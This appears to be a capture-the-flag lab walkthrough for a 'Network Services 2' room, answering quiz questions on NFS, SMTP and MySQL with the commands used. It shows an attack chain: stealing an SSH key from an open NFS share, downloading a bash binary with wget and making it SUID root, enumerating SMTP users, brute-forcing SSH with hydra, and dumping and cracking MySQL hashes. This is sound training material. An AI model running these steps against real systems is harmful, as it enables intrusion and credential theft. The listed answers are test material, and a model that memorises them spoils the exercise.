# Network Services 2

## :card\_box: NFS

### **What does NFS stand for?**

{% hint style="success" %}
**Network File System**
{% endhint %}

### **What process allows an NFS client to interact with a remote directory as though it was a physical device?**

{% hint style="success" %}
mounting
{% endhint %}

### **What does NFS use to represent files and directories on the server?**

{% hint style="success" %}
file handle
{% endhint %}

### **What protocol does NFS use to communicate between the server and client?**

{% hint style="success" %}
RPC
{% endhint %}

### **What two pieces of user data does the NFS server take as parameters for controlling user permissions?**

{% hint style="success" %}
**user id / group id**
{% endhint %}

### **What is the latest version of NFS?**

![](<../../.gitbook/assets/Screenshot from 2020-09-16 16-56-31.png>)

### **Conduct a thorough port scan scan of your choosing, how many ports are open?**

```
nmap -p- -v 10.10.195.187
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 18-29-09.png>)

### **Which port contains the service we're looking to enumerate?**

```
nmap -sV -p2049 10.10.195.187
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 17-03-17.png>)

### **Use showmount to list the NFS shares, what is the name of the visible share?**

```
showmount -e 10.10.195.187
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 17-04-17.png>)

### **What is the name of the folder inside?**

```bash
mkdir /tmp/mount
sudo mount.nfs 10.10.195.187:/home /tmp/mount
cd /tmp/mount/
ls
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 17-06-37.png>)

### **Which of these folders could contain keys that would give us remote access to the server?**

```
ls cappucino/.ssh/
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 17-09-02.png>)

### **Which of these keys is most useful to us?**

{% hint style="success" %}
**id\_rsa**
{% endhint %}

### **Can we log into the machine using ssh?**

```
cd
cp /tmp/mount/cappucino/.ssh/id_rsa
chmod 600 id_rsa
ssh -i id_rsa cappucino@10.10.195.187
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 17-10-48.png>)

### **What letter do we use to set the SUID bit set using chmod?**

```
cd /tmp/mount/cappucino/
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
sudo chown root:root bash
sudo chmod +sx bash
```

### **What does the permission set look like?**

```bash
ls -l bash
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 17-29-49.png>)

### **What's the root flag?**

```bash
cd
ssh -i id_rsa cappucino@10.10.195.187
$ ./bash -p
# cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 17-31-09.png>)

## :incoming\_envelope: SMTP

### **What does SMTP stand for?**

> Simple Mail Transfer Protocol

### **What does SMTP handle the sending of?**

> **emails**

### **What is the first step in the SMTP process?**

> SMTP handshake

### **What is the default SMTP port?**

> 25

### **Where does the SMTP server send the email if the recipient's server is not available?**

> SMTP queue

### **On what server does the Email ultimately end up on?**

> POP/IMAP

### **Can a Linux machine run an SMTP server?**

> **Y**

### **Can a Windows machine run an SMTP server?**

> **Y**

### **What port is SMTP running on?**

```
nmap 10.10.179.49
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-14-38.png>)

### **Start up Metasploit. What command do we use to do this?**

```
msfconsole -q
```

### **Let's search for the module "smtp\_version", what's it's full module name?**

```
msf > search smtp_version
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-16-44.png>)

### **Select the module and list the options. How do we do this?**

```
msf > use 0
msf > options
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-19-48.png>)

### **What is the option we need to set?**

```
msf > set RHOSTS 10.10.179.49
```

### **What's the system mail name?**

```
msf > exploit
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-20-00.png>)

### **What Mail Transfer Agent (MTA) is running the SMTP server?**

> **Postfix**

### **Search for the module "smtp\_enum", what's it's full module name?**

```
msf > search smtp_enum
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-22-17.png>)

### **What option do we need to set to the wordlist's path?**

```
msf > use 0
msf > options
msf > set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-27-24.png>)

### **What is the other essential paramater we need to set?**

```
msf > set RHOSTS 10.10.179.49
```

### **What username is returned?**

```
msf > set THREADS 16
msf > exploit
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-31-30.png>)

### **What is the password of the user we found during our enumeration stage?**

```
hydra -l administrator \
      -P /usr/share/metasploit-framework/data/wordlists/password.lst \
      ssh://10.10.179.49 -I -V -f -t64  
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-40-16.png>)

### **What is contents of smtp.txt**

```
ssh administrator@10.10.179.49 cat smtp.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-41-33.png>)

## :squid: MySQL

### **What type of software is MySQL?**

> **Relational Database Management System**

### **What language is MySQL based on?**

> **SQL**

### **What communication model does MySQL use?**

> **client-server**

### **What is a common application of MySQL?**

> back-end database

### **What major social network uses MySQL as their back-end database?**

> **facebook**

### **What port is MySQL using?**

```
nmap 10.10.16.169
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 18-46-36.png>)

### **What is the name of the monitor we're welcomed to?**

```
mysql -h 10.10.16.169 -u root -p
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 18-47-29.png>)

### **What three options do we need to set?**

```
msfconsole -q
msf > search mysql_sql
msf > use 0
msf > options
msf > set PASSWORD password
msf > set RHOSTS 10.10.16.169
msf > set USERNAME root
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 18-50-36.png>)

### **What result does this give you?**

```
msf > exploit
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 18-53-53.png>)

### **How many databases are returned?**

```
msf > set SQL show databases
msf > exploit
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 18-55-35.png>)

### **Search for and select the "mysql\_schemadump" module. What's the module's full name?**

```
msf > search mysql_schemadump
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 18-59-32.png>)

### **What's the name of the last table that gets dumped?**

```
msf > use 0
msf > set PASSWORD password
msf > set RHOSTS 10.10.16.169
msf > set USERNAME root
msf > exploit
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 19-01-21.png>)

### **Search for and select the "mysql\_hashdump" module. What's the module's full name?**

```
msf > search mysql_hashdump
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 20-46-38.png>)

### **What non-default user stands out to you?**

```
msf > use 1
msf > set PASSWORD password
msf > set RHOSTS 10.10.16.169
msf > set USERNAME root
msf > exploit
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 19-03-54.png>)

### **What is the user/hash combination string?**

> carl:\*EA031893AA21444B170FC2162A56978B8CEECE18

### **What is the password of the user we found?**

```bash
echo -n 'EA031893AA21444B170FC2162A56978B8CEECE18' > mysql.txt
hashcat -a 0 -m 300 mysql.txt /usr/share/wordlists/rockyou.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 20-30-12.png>)

### **What's the contents of MySQL.txt**

```
ssh carl@10.10.20.11 cat MySQL.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 20-37-20.png>)

## :link: Support Material

{% embed url="https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash" %}

